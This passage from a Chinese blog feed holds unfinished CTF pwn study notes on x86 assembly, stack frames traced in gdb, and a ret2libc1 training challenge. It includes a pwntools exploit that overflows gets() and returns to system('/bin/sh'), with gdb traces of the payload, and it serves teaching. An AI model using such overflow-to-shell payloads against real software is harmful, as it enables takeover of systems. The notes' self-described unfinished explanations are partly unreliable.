world了</span><br></pre></td></tr></table></figure><p>1、ida反编译一个二进制文件，我这是以ctfwiki中的ret2text为例，文件下载地址：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>这是main函数</p><p><img src="image-20220702152227493.png" alt="image-20220702152227493"></p><p>我们查看main函数的汇编：</p><p><img src="image-20220702152701909.png" alt="image-20220702152701909"></p><p>.text段对应内存五大分区中的代码区</p><p><img src="image-20220702154257524.png" alt="image-20220702154257524"></p><p>拉动滚动条，在最左端我们会查看到LOAD、.fini、.eh_frame_hdr、got、got.plt、.plt、.rodata、.bss……等很多字段</p><p><img src="image-20220702153044662.png" alt="image-20220702153044662"></p><p><img src="image-20220702153210284.png" alt="image-20220702153210284"></p><p><img src="image-20220702153317342.png" alt="image-20220702153317342"></p><p><img src="image-20220702153417786.png" alt="image-20220702153417786"></p><p>然后我主要要讲的就是.data、.rodata、.bss、.text，.text前面讲了，接下来讲一下前三个</p><p>.data是代码段.rodata是只读代码段，详见下面的链接</p><p>链接：<a href="https://blog.csdn.net/laiqun_ai/article/details/8528366">bss、data和rodata区别与联系_brlee的博客-CSDN博客_rodata</a></p><p><img src="image-20220702153039971.png" alt="image-20220702153039971"></p><p><img src="image-20220702154424740.png" alt="image-20220702154424740"></p><p><img src="image-20220702154100740.png" alt="image-20220702154100740"></p><p>.bss段是指静态代码段，程序中未赋值的变量就会存储在这，例如C代码中定义了一个 int a；但为给a赋值，a就会存到.bss段</p><p><img src="image-20220702153359957.png" alt="image-20220702153359957"></p><p><img src="image-20220702154040757.png" alt="image-20220702154040757"></p><p>这张图还是贴一下吧       来源：<a href="https://www.jianshu.com/p/a3e80cb5198b">内存五大分区 - 简书 (jianshu.com)</a></p><p><img src="image-20220702154839416.png" alt="image-20220702154839416"></p><p>现在回头看一下这个hello world </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global _start            ; 指定入口函数</span><br><span class="line">_start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">        </span><br><span class="line">#global 全局变量</span><br><span class="line">#_start 对比main函数去理解</span><br><span class="line">#int 0x80 系统调用（进入内核模式），在这条指令前，先往指定寄存器中压入值,进入内核模式后，</span><br><span class="line">#系统根据指定寄存器中的值判断做什么样的操作（操作的例子：退出程序、文件读写打开关闭等一系列操作）</span><br></pre></td></tr></table></figure><p>对于汇编代码中的指令符，以下是我个人记录的一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">数据传送与访问：mov</span><br><span class="line"></span><br><span class="line">算术运算与逻辑运算：</span><br><span class="line">inc/dec      #操作数±1</span><br><span class="line">add/sub      #长度相同的操作数相加减</span><br><span class="line">and/or #按位逻辑与/或</span><br><span class="line">mul          #乘法操作</span><br><span class="line">xor          #异或操作，常用做寄存器值置零</span><br><span class="line">cmp          #比较两个值</span><br><span class="line">neg          #将操作数转换为二进制补码，并将操作数的符号位取反</span><br><span class="line">    </span><br><span class="line">跳转指令与循环指令：</span><br><span class="line">jmp          #无条件跳转指令，一般需要使用一个标号来标识，可以实现循环</span><br><span class="line">LOOP         #循环指令，每循环一次循环计数寄存器减1</span><br><span class="line">je           #条件跳转，链接：https://blog.csdn.net/ssihc0/article/details/5215044</span><br><span class="line">test         #与AND命令有相同效果，只是Test指令不改变AX和BX的内容，而AND指令会把结果保存到AX中</span><br><span class="line"></span><br><span class="line">栈与函数调用：</span><br><span class="line">push         #入栈，详细操作P41</span><br><span class="line">pop          #从栈中pop一个值，给ebp</span><br><span class="line"></span><br><span class="line">使用栈保存函数返回地址：</span><br><span class="line">call         #call调用子函数时，下一条指令的地址作为返回地址存入栈中</span><br><span class="line">             #相当于   push IP</span><br><span class="line">                 #        jmp near ptr 标号    这两条汇编</span><br><span class="line"> #https://blog.csdn.net/u013018721/article/details/51264199</span><br><span class="line">ret          #往栈上高地址一个单位取地址当做跳转地址   *******</span><br><span class="line"> #链接：https://blog.csdn.net/qq_37340753/article/details/81585083</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">lea          #官方解释Load Effective Address，即装入有效地址的意思，它的操作数就是地址</span><br><span class="line">nop          #空操作，链接：https://www.cnblogs.com/shangzhijian/p/4994028.html</span><br><span class="line">leave        #mov esp,ebp和pop ebp</span><br><span class="line"> #链接：https://blog.csdn.net/striver1205/article/details/25216699</span><br><span class="line"> #链接：https://blog.csdn.net/zhangxinrun/article/details/5888425</span><br><span class="line">int 0x80     #系统调用</span><br></pre></td></tr></table></figure><p>emm…暂时打住，这篇暂时就到这吧</p><p>QAQ</p>]]></content>
    
    
    <summary type="html">不完善，不荐参考</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>栈分析-2</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/17/%E6%A0%88%E5%88%86%E6%9E%90-2/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/17/%E6%A0%88%E5%88%86%E6%9E%90-2/</id>
    <published>2022-04-17T01:03:50.000Z</published>
    <updated>2022-08-05T03:06:08.206Z</updated>
    
    <content type="html"><![CDATA[<p>之前的 “栈分析” 一文尝试将plt、got表与exp中payload一起分析完，因为当时本人对一些基础概念的错误理解导致没有完成，回看文章发现篇幅过大，看起来很是疲惫，所以打算分开分析，这里就先只尝试分析exp中的payload，对了，之后一些基本指令的使用就不贴图了，以减少图片数量</p><br/><h1 id="函数调用过程中的栈上数据存储情况"><a href="#函数调用过程中的栈上数据存储情况" class="headerlink" title="函数调用过程中的栈上数据存储情况"></a>函数调用过程中的栈上数据存储情况</h1><p><img src="5.png" alt="32位的栈"></p><p>调用一个函数前，会把被调函数的参数从右至左依次入栈，再把下一条指令的地址作为被调函数的返回地址入栈</p><p><img src="image-20220421204957179.png" alt="image-20220421204957179"></p><br/><br/><h1 id="函数运行时栈况"><a href="#函数运行时栈况" class="headerlink" title="函数运行时栈况"></a>函数运行时栈况</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#源码</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line">haha();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">haha</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">lala();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lala</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wawa&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><p>如何编译以上C代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、ubuntu中建立.c文件，将以上代码复制到.c文件中（我建立的文件名为hawala.c）</span><br><span class="line">2、$ gcc -o hawala.out hawala.c -m32</span><br><span class="line">3、得到hawala.out32位二进制文件</span><br></pre></td></tr></table></figure><p>以上得到的 hawala.out 复制到 windows 下，丢进32位ida得到反编译汇编码</p><p>main()函数与haha()函数：</p><p><img src="image-20220417093548450.png" alt="image-20220417093548450"></p><p>lala()函数在此不列出，自己去看。</p><br/><p>由以上三个函数我们可以看到普通函数的函数头与函数尾的汇编指令大致与下图无异</p><p><img src="image-20220413101030564.png" alt="image-20220413101030564"></p><h2 id="单看函数头与函数尾"><a href="#单看函数头与函数尾" class="headerlink" title="单看函数头与函数尾"></a>单看函数头与函数尾</h2><p>图1（初始栈况）：地址值均为假设，栈右边为栈地址，栈中间为栈上存储的数据，ebp、esp存储的值为栈地址，栈从高地址向低地址生长。十六进制，一个数字代表4位</p><p><img src="image-20220413104217132.png" alt="image-20220413104217132"></p><p>图2（函数头）：push  ebp  ，效果，esp下移，ebp寄存器的值入栈（下图中ebp存储的是栈地址0xffff0080）</p><p><img src="image-20220417092141319.png" alt="image-20220417092141319"></p><p>图3（函数头）：mov  ebp, esp  ，效果，esp值赋给ebp</p><p><img src="image-20220413104939500.png" alt="image-20220413104939500"></p><p>图4（函数头）：and  esp, 0FFFFFFF0h  (注意这是9位数，带7个F，其中h表示16进制），将esp与0xfffffff0进行按位与操作，好像是对齐操作，总之效果就是将esp的后四位置0，使esp指针向下移动，又由图2知此时esp寄存器值为0xffff0070，后四位为0，所以将它与0xfffffff0按位与后esp位置不变</p><p><img src="image-20220413105821968.png" alt="image-20220413105821968"></p><p>图5：假设函数中间的汇编使esp执行到了向下的任意位置，但ebp是不会变的</p><p><img src="image-20220413110344050.png" alt="image-20220413110344050"></p><p>图6（函数尾）：mov  esp， ebp  ，效果：ebp的值赋给esp，导致esp指向0xffff0070</p><p><img src="image-20220413110623204.png" alt="image-20220413110623204"></p><p>图7（函数尾）：pop  ebp   ，效果：取出esp指向的栈上的数据赋给ebp，esp再自增四个字节</p><p><img src="image-20220413111149492.png" alt="image-20220413111149492"></p><p>图8（函数尾）：pop  eip  ，效果：此时eip被赋值为0xffff0074地址处的值0x????????</p><p><img src="image-20220413111516961.png" alt="image-20220413111516961"></p><p>最后：  jmp  eip  ，效果：程序跳转到eip寄存器上的地址开始执行，若现在正在执行lala()函数中的jmp eip，在程序没有发生栈溢出等使0xffff0074地址上的地址数据被修改情况下，那么，jmp eip跳转到的将是haha()函数</p><br/><p>上述过程没有列出函数中间部分的汇编指令对esp、ebp的影响（只列出了函数头/尾的影响），这里也不解释太多，继续往下看就行了。</p><p>对了，有一个关键词—-“栈平衡”，没事可以去百度搜搜看</p><br/><p><img src="image-20220417101120336.png" alt="image-20220417101120336"></p><p><img src="image-20220413115522038-16501575766301.png" alt="image-20220413115522038"></p><br/><br/><h2 id="函数调用子函数"><a href="#函数调用子函数" class="headerlink" title="函数调用子函数"></a>函数调用子函数</h2><p>Ubuntu使用gdb调试hawala.out（上一步中生成的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ gdb hawala.out</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置三个断点</span></span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">pwndbg&gt; b haha</span><br><span class="line">pwndbg&gt; b lala</span><br><span class="line"></span><br><span class="line"><span class="comment">#r运行</span></span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p>1、ni单步到call  haha，<strong>记录好调call前的ebp：0xffffcff8   esp：0xffffcff0</strong></p><p>我们接下来看看调用过程中的ebp、esp变化</p><p><img src="image-20220417103116882.png" alt="image-20220417103116882"></p><p>2、对比上一张图可以看到，这步ni调call，有两处改变：</p><p>1）、栈中压入下一条指令地址，即：push  IP，不过这里的IP是下一条PC指令地址</p><p>2）、我们的PC指针也是从0x565561e1指向了0x565561ed</p><p><strong>此时的ebp：0xffffcff8   esp：0xffffcfec</strong></p><p><img src="image-20220417102533393.png" alt="image-20220417102533393"></p><p>3、继续ni，可以看到ebp、esp都没变，PC指针指向下一指令，<strong>此时的ebp：0xffffcff8   esp：0xffffcfec</strong></p><p><img src="image-20220417105706324.png" alt="image-20220417105706324"></p><p>4、继续ni，可以看到ebp的值已经入栈，入栈的位置是0xffffcfe8，<strong>此时的ebp：0xffffcff8   esp：0xffffcfe8</strong></p><p><img src="image-20220417105931329.png" alt="image-20220417105931329"></p><p>5、继续ni，可以看到我们的ebp已经改变为0xffffcfe8，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe8</strong></p><p><img src="image-20220417111332760.png" alt="image-20220417111332760"></p><p>6、ni，sub  esp,8，向下开辟8字节栈空间，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p><img src="image-20220417112901330.png" alt="image-20220417112901330"></p><p>7、next，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p>这一步调call指令验证了调用一个call的前后，ebp、esp值不变，</p><p><img src="image-20220417113148725.png" alt="image-20220417113148725"></p><p>8、ni，下一步调用lala()函数，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p><img src="image-20220417113718734.png" alt="image-20220417113718734"></p><p>9、这里我直接多步ni跳出call  lala，因为我们现在在看main中调haha()函数，再看一遍haha()函数中调lala()函数效果一样，所以直接多步ni跳过，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p>可以看到，haha()中调用lala()前后，ebp、esp不变</p><p><img src="image-20220417114155053.png" alt="image-20220417114155053"></p><p>10、ni，执行一个nop，即无操作，<strong>此时的ebp：0xffffcfe8   esp：0xffffcfe0</strong></p><p><img src="image-20220417114327923.png" alt="image-20220417114327923"></p><p>11、ni，<strong>此时的ebp：0xffffcff8   esp：0xffffcfec</strong></p><p><img src="image-20220417114517687.png" alt="image-20220417114517687"></p><p>12、ni，我们回到了main函数，__此时的ebp：0xffffcff8   esp：0xffffcff0__，是不是跟调用haha()前的ebp、esp一样？ok，自己思考一下，聪明的你想必可以想出 <strong>“栈平衡”</strong> 具体的含义了</p><p><img src="image-20220417114625688.png" alt="image-20220417114625688"></p><p>这时再回头看看这张图，自己体会一下  ^_^</p><p><img src="image-20220417115045351.png" alt="image-20220417115045351"></p><br/><br/><h1 id="exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）"><a href="#exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）" class="headerlink" title="exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）"></a>exp中payload分析（这里不用看，意义不大，个人想保留所以留在这，请直接看下面的exp中payload分析1）</h1><p>注：个人笔记，重在个人看懂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ret2libc1</span></span><br><span class="line">    payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048720</span>    </span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt,<span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"><span class="comment">#在sh进程中，启动gdb调试，并在0x08048683地址处设置断点</span></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;b *0x08048683&quot;</span>)    </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#ida</span><br><span class="line"></span><br><span class="line">.text:0804867E                 call    _gets</span><br><span class="line">.text:08048683                 mov     eax, 0</span><br><span class="line">.text:08048688                 leave</span><br><span class="line">.text:08048689                 retn</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb</span></span><br><span class="line"></span><br><span class="line">   0x8048683  &lt;main+107&gt;         mov    eax, 0</span><br><span class="line">   0x8048688  &lt;main+112&gt;         leave  </span><br><span class="line">   0x8048689  &lt;main+113&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048460  &lt;system@plt&gt;       jmp    dword ptr [system@got.plt]    &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048466  &lt;system@plt+6&gt;     push   0x18</span><br><span class="line">   0x804846b  &lt;system@plt+11&gt;    jmp    0x8048420                     &lt;0x8048420&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048420                     push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048426                     jmp    dword ptr [0x804a008]         &lt;0xf7f05b10&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7f05b10                    endbr32 </span><br><span class="line">   0xf7f05b14                    push   eax</span><br><span class="line">   0xf7f05b15                    push   ecx</span><br><span class="line">   0xf7f05b16                    push   edx</span><br><span class="line">   0xf7f05b17                    mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7f05b1b                    mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7f05b1f                    call   0xf7eff7d0                    &lt;0xf7eff7d0&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7f05b24                    pop    edx</span><br><span class="line">   0xf7f05b25                mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7f05b28                mov    dword ptr [esp], eax</span><br><span class="line">   0xf7f05b2b                mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7f05b2f                ret    0xc                           &lt;0xf7f1b000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d25790 &lt;system&gt;       endbr32 </span><br><span class="line"> ► 0xf7d25794 &lt;system+4&gt;     call   __x86.get_pc_thunk.dx                    &lt;__x86.get_pc_thunk.dx&gt;</span><br><span class="line">        arg[0]: 0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">        arg[1]: 0x8048720 ◂— das     /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">        arg[2]: 0xff8be200 —▸ 0xf7ecf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br><span class="line">        arg[3]: 0xff8be244 ◂— 0x0</span><br><span class="line"> </span><br><span class="line">   0xf7d25799 &lt;system+9&gt;     add    edx, 0x1a9867</span><br><span class="line">   0xf7d2579f &lt;system+15&gt;    sub    esp, 0xc</span><br><span class="line">   0xf7d257a2 &lt;system+18&gt;    mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7d257a6 &lt;system+22&gt;    <span class="built_in">test</span>   eax, eax</span><br><span class="line">   0xf7d257a8 &lt;system+24&gt;    je     system+40                    &lt;system+40&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d257aa &lt;system+26&gt;    add    esp, 0xc</span><br><span class="line">   0xf7d257ad &lt;system+29&gt;    jmp    do_system                    &lt;do_system&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d257b2 &lt;system+34&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d257b8 &lt;system+40&gt;    lea    eax, [edx - 0x5cc95]</span><br><span class="line">   </span><br><span class="line"><span class="comment">#因为发现了一个神奇的现象，我进行了重新运行，后面的汇编还没copy，</span></span><br><span class="line"><span class="comment">#而重新运行导致有些地址发生改变，所以我在后面重新弄了一个</span></span><br></pre></td></tr></table></figure><p>发现一个神奇的现象</p><p><img src="image-20220419210804958.png" alt="image-20220419210804958"></p><p>单步一个ret，让我的esp增了0x10</p><p><img src="image-20220419210859590.png" alt="image-20220419210859590"></p><p>不猜测了，重新运行一遍，这步ret用si调，行吧，一样的，还是增了0x10，就挺奇怪，ret怎么会改变esp呢……</p><p><img src="image-20220419211551474.png" alt="image-20220419211551474"></p><p><img src="image-20220419211547282.png" alt="image-20220419211547282"></p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb</span></span><br><span class="line"></span><br><span class="line">0x8048683  &lt;main+107&gt;         mov    eax, 0</span><br><span class="line">   0x8048688  &lt;main+112&gt;         leave  </span><br><span class="line">   0x8048689  &lt;main+113&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048460  &lt;system@plt&gt;       jmp    dword ptr [system@got.plt]    &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048466  &lt;system@plt+6&gt;     push   0x18</span><br><span class="line">   0x804846b  &lt;system@plt+11&gt;    jmp    0x8048420                     &lt;0x8048420&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048420                     push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048426                     jmp    dword ptr [0x804a008]         &lt;0xf7f74b10&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7f74b10                    endbr32 </span><br><span class="line">   0xf7f74b14                    push   eax</span><br><span class="line">   0xf7f74b15                    push   ecx</span><br><span class="line">   0xf7f74b16                    push   edx</span><br><span class="line">   0xf7f74b17                    mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7f74b1b                    mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7f74b1f                    call   0xf7f6e7d0                    &lt;0xf7f6e7d0&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7f74b24                pop    edx</span><br><span class="line">   0xf7f74b25                mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7f74b28                mov    dword ptr [esp], eax</span><br><span class="line">   0xf7f74b2b                mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7f74b2f                ret    0xc</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d94790 &lt;system&gt;       endbr32</span><br><span class="line"> ► 0xf7d94794 &lt;system+4&gt;     call   __x86.get_pc_thunk.dx        &lt;__x86.get_pc_thunk.dx&gt;</span><br><span class="line">        arg[0]: 0x62626262 (<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">        arg[1]: 0x8048720 ◂— das     /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">        arg[2]: 0xfff5eb00 —▸ 0xf7d94790 (system) ◂— endbr32 </span><br><span class="line">        arg[3]: 0xfff5eb34 ◂— 0x0</span><br><span class="line"> </span><br><span class="line">   0xf7d94799 &lt;system+9&gt;     add    edx, 0x1a9867</span><br><span class="line">   0xf7d9479f &lt;system+15&gt;    sub    esp, 0xc</span><br><span class="line">   0xf7d947a2 &lt;system+18&gt;    mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7d947a6 &lt;system+22&gt;    <span class="built_in">test</span>   eax, eax</span><br><span class="line">   0xf7d947a8 &lt;system+24&gt;    je     system+40                    &lt;system+40&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d947aa &lt;system+26&gt;    add    esp, 0xc</span><br><span class="line">   0xf7d947ad &lt;system+29&gt;    jmp    do_system                    &lt;do_system&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------以下两句尚未执行就跳转至别处-----------------------# </span></span><br><span class="line">   0xf7d947b2 &lt;system+34&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d947b8 &lt;system+40&gt;    lea    eax, [edx - 0x5cc95]</span><br><span class="line"><span class="comment">#---------------------------------------------------------# </span></span><br><span class="line"></span><br><span class="line">   0xf7d947ad 